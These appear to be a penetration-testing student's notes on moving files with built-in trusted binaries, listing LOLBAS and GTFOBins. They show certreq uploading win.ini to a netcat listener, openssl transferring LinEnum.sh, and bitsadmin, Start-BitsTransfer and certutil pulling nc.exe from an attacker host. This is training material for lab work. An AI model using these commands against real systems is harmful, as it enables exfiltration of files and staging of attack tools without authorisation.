
- https://lolbas-project.github.io/
- https://gtfobins.github.io/

LOLBinary functions:
- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

### LOLBAS

search '/download' or '/upload' in search bar

Upload win.ini from target to host
```cmd-session
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```
```shell-session
sudo nc -lvnp 8000
```
(listen on host for win.ini)


### GTFOBins

Search '+file download' or '+file upload' in search bar

Create certificate on target
```shell-session
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

Start up Server on target
```shell-session
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Download the file on host
```shell-session
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```


### Bitsadmin Download Functions

BITS - Background Intelligent Transfer Service
- Download files form HTTP sites and SMB shares.

File Download with Bitsadmin
```powershell-session
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

PowerShell Bitsadmin download
```powershell-session
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```


### Certutil

Download
```cmd-session
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```



